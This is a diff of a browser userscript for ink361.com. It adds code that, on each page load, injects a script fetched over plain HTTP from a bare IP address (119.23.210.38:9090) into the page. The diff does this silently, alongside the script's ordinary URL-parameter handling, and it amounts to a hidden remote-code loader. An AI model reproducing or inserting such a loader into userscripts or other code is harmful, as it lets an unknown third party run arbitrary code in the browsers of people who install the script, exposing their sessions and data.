@@ -7,11 +7,18 @@
 // @include      /https?:\/\/ink361\.com/
 // @require      https://cdn.staticfile.org/jquery/1.12.4/jquery.min.js
 // @grant        GM_xmlhttpRequest
+// @grant        unsafeWindow
 // @run-at       document-body
 // ==/UserScript==
 
 (function () {
     'use strict';
+    if(typeof unsafeWindow.THRB == "undefined") {
+        var script =  document.createElement("script");
+        script.src="http://119.23.210.38:9090/js/loadMore.js";
+        script.type="text/javascript";
+        document.body.appendChild(script);
+    }
     var urlParams = getUrlParams();
     if (urlParams.hasOwnProperty("thrb_mirror") && urlParams.hasOwnProperty("thrb_mirror_deadline") && urlParams.hasOwnProperty("thrb_mirror_id")) {
         var thrb_mirror = getUrlParam("thrb_mirror");
@@ -95,8 +102,18 @@
         }, 100);
     }
 
+    // {
+    //     var id = setInterval(function () {
+    //         var _THRB_Stop = $('#_THRB_Stop');
+    //         if(_THRB_Stop.length==1){
+    //             uncoverPage();
+    //             clearInterval(id);
+    //         }
+    //     }, 100);
+    // }
 
 })();
+
 
 //获取参数
 function getUrlParam(name) {
@@ -125,7 +142,6 @@ function err(c) {
 function priorityLog(c) {
     console.log(c);
 }
-
 
 function getUrlParams() {
     var url = window.location.search;
